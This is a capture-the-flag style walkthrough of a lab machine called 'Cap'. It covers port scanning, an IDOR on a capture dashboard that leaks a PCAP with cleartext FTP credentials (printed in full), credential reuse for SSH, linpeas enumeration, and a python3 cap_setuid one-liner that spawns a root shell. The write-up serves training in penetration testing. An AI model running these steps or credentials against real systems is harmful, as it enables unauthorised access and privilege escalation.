# Cap

**Goal:** Exploit IDOR in a network capture dashboard to obtain cleartext credentials, then abuse Python capabilities for privilege escalation.

## Reconnaissance

```bash
nmap --min-rate 10000 --max-retries 2 -p- -sC -sV <target-ip>
```

> I've since realized that 10000 is too aggressive and would drop packets, I'd dial it down to at most 5000.

**Open ports:**

- `21` — FTP (anonymous login disabled)
- `22` — SSH
- `80` — HTTP

## Enumeration

- I visited `http://<target-ip>` in a browser and landed on the what seems to be a SOC dashboard.
- The dashboard shows user `nathan` is logged in.
- Nathan's user ID: `2` → data endpoint at `/data/2` returns an empty PCAP
- IDOR: `/data/0` returns a non-empty PCAP containing cleartext FTP credentials

> `/data/0` was a deliberate guess based on the common convention of ID 0 or 1 being reserved for an admin account.

## Credentials

Opening the PCAP in Wireshark gives os the following cleartext credentials for FTP.

```text
nathan:Buck3tH4TF0RM3!
```

I've confirmed it also works for SSH.

## Privilege Escalation

I transferred `linpeas.sh` to the target via `scp` using the recovered credentials.

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh nathan:@<target-ip>:~/
```

Run and save output:

```bash
bash linpeas.sh -N > linpeas_results.txt # -N flag for no color
```

I transferred the results back from the target via `scp` for review.

```bash
scp nathan:@<target-ip>:linpeas_results.txt .
```

Check the **Files with Capabilities** section:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

> This took ages to figure out, linpeas is too noisy!

Abuse `cap_setuid` to escalate to root:

```bash
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```
